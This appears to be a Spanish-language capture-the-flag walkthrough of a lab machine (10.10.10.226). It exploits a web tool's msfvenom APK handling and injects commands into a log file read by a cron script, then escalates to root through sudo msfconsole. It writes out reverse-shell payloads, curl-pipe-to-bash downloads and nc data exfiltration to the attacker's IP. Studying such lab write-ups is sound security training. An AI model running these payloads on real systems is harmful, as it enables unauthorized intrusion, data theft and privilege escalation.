## Summary

Tags: 
Y
- IP -> 10.10.10.226
- Ports -> TCP (22, 5000), UDP (idk)
- OS ->  Ubuntu Focal
- Services & Applications
    - 22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
    - 5000 -> Werkzeug httpd 0.16.1 (python 3.8.5)


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
- Comando -> **whatweb http://10.10.10.226:5000** Miramos el gestor de contenidos

Miramos la pagina Web en ese puerto especifico, y encontramos que:
1. En la primer parte se puede ejecutar el comando nmap
2. En la segunda parte de puede ejecutar por detras el comando msfvenom (Windows, Linux y Android)
3. En la tercer parte se podria estar ejecutando el comando searchsploit

- Comando -> **searchsploit msfvenom** Para buscar vulnerabilidades asociadas con msfvenom, y encontramos una que te crea un APK malicioso
- Comando -> **searchsploit -m msfvenom** Nos traemos el exploit **.py** a nuestra maquina, despues lo miramos con **cat** y en una parte del exploit lo modificamos de la siguiente manera en la parte de payload: 
	nano msfvenom.py
		**payload = 'ping -c 1 10.10.14.17'** Haremos que nos ejecute un ping a nuestra maquina
	
- Comando -> **python3 msfvenom.py** Al momento de ejecutarlo nos crea la aplicacion APK  
- Comando -> **chown omarv:omarv -R /tmp/tmp7/**  Le cambiamos el usuario al directorio del APK creado
El APK lo cargamos en la pagina Web en la parte de browse, antes de ejecutarlo nos ponemos en escucha
- Comando -> **tcpsump -i tun0 icmp -n** Nos ponemos en escucha para trazas icmp y asi recibir el ping y recibimos los ping

Nos damos cuenta que tenemos ejecucion remota de comandos, por lo que nos creamos un archivo asi:
	nano index.html
		**#!/bin/bash/**
		**bash -i >& /dev/tcp/10.10.14.17/443 0>&1**
- Comando -> **python3 -m http.server 80** Nos compartimos un servidos http por el puerto 80, para que nos puedan hacer el curl

Volvemos a modificar el **msfvenom** de la siguiente manera en la parte de payload: 
	nano msfvenom.py
		**payload = 'curl 10.10.14.17 | bash'** Haremos que nos ejecute un curl a nuestra maquina, el cual buscara el index.html que habiamos creado
	
- Comando -> **python3 msfvenom.py** Al momento de ejecutarlo nos crea la aplicacion APK
- Comando -> **chown omarv:omarv -R /tmp/tmp8/**  Le cambiamos el usuario al directorio del APK creado
El APK lo cargamos en la pagina Web en la parte de browse

- Comando -> **nc -nlvp 443** Nos ponemos en escucha por el puerto 443, para recibir la peticion y nos de una revershell

## User
Una vez dentro tratamos la consola 
Nos creamos una pseudo consola con los siguientes comandos.
 **Script /dev/null -c bash** Nos sales que esto no se puede hacer, por lo que hacemos lo siguiente
 **python3 -c ‘import pty;pty.spawn(“/bin/bash”)’** Para remplazar lo de arriba por si no nos deja
 **Ctrl + z**
 **stty raw -echo; fg**
 **reset xterm**

Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
**echo $SHELL** Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
**export SHELL=bash** Hacemos que shell ahora valga bash
**export TERM=xterm**

Ahora para modificar las dimensiones de nano debemos hacer lo siguiente.
**stty size** Con este comando podemos ver las dimensiones de la consola nano de 24 80 por lo que debemos de modificar ese valor a este
**stty rows 51 columns 189** Modificamos las dimenesiones de la consola nano

Obtenemos acceso a la maquina victima pero estamos como el usuario kid, por lo que buscamos la flag **user.txt**

Encontramos una dir llamado **logs**, el cual tiene los privilegios 777 y contiene un archivo llamado **hackers** el cual no tiene contenido y si le metemos algo este desaparece, por lo que nos descargaremos el **pspy** para detectar los procesos que estan corriendo.

Buscamos en Google pspy (**pspy-monitor Linux Github**), nos dirigimos a los releases y nos descargamos el **pspy64**, el cual se descargara en la carpeta de Downloads.

- Comando -> **chmod +x pspy** Le damos permisos de ejecucion tanto a usuario, grupo y otros
- Comando -> **upx pspy** Para bajarle el peso al archivo
- Comando -> **python3 -m http.server 80** Nos compartimos un servidos http por el puerto 80, para que cuando nos hagan un wget puedan cargar el archivo pspy
- Comando -> **wget http:/10.10.14.17/pspy** Para poder cargar un archivo especifico desde una IP, en este caso nuestra IP y nos cargaremos el pspy
En la maquina victima le damos permisos de ejecucion 
- Comando -> **chmod +x pspy** Le damos permisos de ejecucion tanto a usuario, grupo y otros
- Comando -> **./pspy** Ejecutamos el archivo, despues en la pagina web mandamos algo por el campo searchsploit y miramos que sucede

Nos damos cuenta que se esta ajecutando un nmap top 10 open ports, en donde hay un usuario llamado **pwn** que ejecuta un archivo **scanlosers.sh**. Al momento de inspeccionar ese archivo con un **cat**, nos damos cuenta que contine la siguiente:
	nano scanlosers.sh
		#!bin/bash
		log=/home/kids/log/hacker
		cd /home/pwd
		cat $log | cut -d' ' **-f3-** | sort u | while read ip; do
			sh -c "nmap --top-ports 10 -oN reccon/${**ip**}.nmap ${ip} 2>&1 >/dev/null" & 
         done 
         
Podemos que primero usa el archivo **hackers** que habiamos encontrado en el dir log, luego observamos que se mueve de directorio y al archivo hackers le hace un filtro con cut, y despues filtra por el -f3- significa que es el tercer campo, pero tambien nos indica que no solo agarra el tercer argumento que entra, sino que tambien agarra todos los argumentos despues de este, y lo que obtiene es una IP, por lo que ahi podriamos meter codigo para que ese se ejecute. 

Por lo que hacemos lo siguiente:
- **cd /home/kids/logs** Nos metemos al directorio de los log, para modificar el archivo hackers
- **echo "[2022-09-06 20:26:59] 10.10.14.17; ping -c 1 10.10.14.17 #" > hackers** (#=comentar lo que resta de la linea) y al momento de que lo lea el archivo de scanlosers no ejecute la segunda parte de nmap y solo nos aplique el comando. Que en este caso nos hara un ping a nuestra maquina por lo que nos ponemos en escucha. 
- **tcpdump -i tun0 icmp -n** Nos ponemos en escucha para recibir los los icmp
Una vez que miramos que si nos dan los ping, hacemos lo siguiente...

- **echo "[2022-09-06 20:26:59] 10.10.14.17; whoami | nc 10.10.14.17 443 #" > hackers** (#=comentar lo que resta de la linea) y al momento de que lo lea el archivo de scanlosers no ejecute la segunda parte de nmap y solo nos aplique el comando. Que en este caso nos regresara el usuairo de whoami
- **nc -nlvp 443** Nos ponemos en escucha por el puerto 443, todo esto con el fin de probar


- **echo "[2022-09-06 20:26:59] 10.10.14.17; curl 10.10.14.17 443 | bash  #" > hackers** (#=comentar lo que resta de la linea) y al momento de que lo lea el archivo de scanlosers no ejecute la segunda parte de nmap y solo nos aplique el comando. Que en este caso nos hara un curl buscando el archivo index.html el cual ya estamos compartiendo y tiene una revershell

Usaremos el comando que ya habiamos creado:
	nano index.html
		**#!/bin/bash/**
		**bash -i >& /dev/tcp/10.10.14.17/443 0>&1**

- Comando -> **python3 -m http.server 80** Nos compartimos un servidos http por el puerto 80
- **nc -nlvp 443** Nos ponemos en escucha por el puerto 443

Y asi es como se hace el Pivoting al usuario pwd.

## Root

Una vez siendo el usuario Pwn

- Comando -> **sudo -l** Para ver los privilegios de sudoers, y descubrimos que que podemos ejecutar metasploit como el usuario root sin password (root) NO PASSWD : /opt/metasploit-framework-6.0.9/msfconsole

- Comando -> **sudo msfconsole -q** Abrimos el metaesploit como usuario root

Una vez adentro de metasploit 
- Comando -> **irb** Para conseguir una consola interactiva de Ruby
- >**system("whoami")** Podemos ejecutar comandos
- >**system("bash")** Nos da directamente una consola bash 